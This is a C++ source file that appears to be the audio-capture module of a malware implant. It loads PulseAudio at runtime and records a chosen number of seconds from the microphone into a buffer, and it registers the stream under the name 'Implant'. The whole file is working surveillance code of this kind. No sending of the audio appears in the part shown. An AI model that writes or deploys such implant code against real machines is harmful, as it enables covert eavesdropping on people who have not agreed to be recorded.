#include "Audio.h"
#include <unistd.h>
#include <vector>
#include <string>
#include <cstring>
#include <dlfcn.h>
#include <pulse/simple.h>
#include <pulse/error.h>
#include "../utils/Logger.h"

namespace capture {

    typedef pa_simple* (*pa_simple_new_t)(const char*, const char*, pa_stream_direction_t, const char*, const char*, const pa_sample_spec*, const pa_channel_map*, const pa_buffer_attr*, int*);
    typedef int (*pa_simple_read_t)(pa_simple*, void*, size_t, int*);
    typedef void (*pa_simple_free_t)(pa_simple*);
    typedef const char* (*pa_strerror_t)(int);

    std::vector<BYTE> RecordAudio(int seconds) {
        std::vector<BYTE> buffer;

        void* handle = dlopen("libpulse-simple.so.0", RTLD_LAZY);
        if (!handle) handle = dlopen("libpulse-simple.so", RTLD_LAZY);
        if (!handle) {
            LOG_ERR("Failed to load libpulse-simple. Audio recording unavailable.");
            return buffer;
        }

        auto fn_new = (pa_simple_new_t)dlsym(handle, "pa_simple_new");
        auto fn_read = (pa_simple_read_t)dlsym(handle, "pa_simple_read");
        auto fn_free = (pa_simple_free_t)dlsym(handle, "pa_simple_free");
        auto fn_strerror = (pa_strerror_t)dlsym(handle, "pa_strerror");

        if (!fn_new || !fn_read || !fn_free || !fn_strerror) {
            LOG_ERR("Failed to find PulseAudio symbols.");
            dlclose(handle);
            return buffer;
        }

        // PA Simple API settings
        static const pa_sample_spec ss = {
            .format = PA_SAMPLE_S16LE,
            .rate = 44100,
            .channels = 2
        };

        int error;
        pa_simple* s = fn_new(NULL, "Implant", PA_STREAM_RECORD, NULL, "record", &ss, NULL, NULL, &error);
        if (!s) {
            LOG_ERR("pa_simple_new() failed: " + std::string(fn_strerror(error)));
            dlclose(handle);
            return buffer;
        }

        // 44100Hz * 2 channels * 2 bytes/sample * seconds
        size_t bytesToRecord = 44100 * 2 * 2 * seconds;
        buffer.resize(bytesToRecord);

        size_t totalRead = 0;
        unsigned char tmp[4096];
        while (totalRead < bytesToRecord) {
            size_t toRead = std::min(sizeof(tmp), bytesToRecord - totalRead);
            if (fn_read(s, tmp, toRead, &error) < 0) {
                LOG_ERR("pa_simple_read() failed: " + std::string(fn_strerror(error)));
                break;
            }
            memcpy(buffer.data() + totalRead, tmp, toRead);
            totalRead += toRead;
        }

        fn_free(s);
        dlclose(handle);
        return buffer;
    }
}
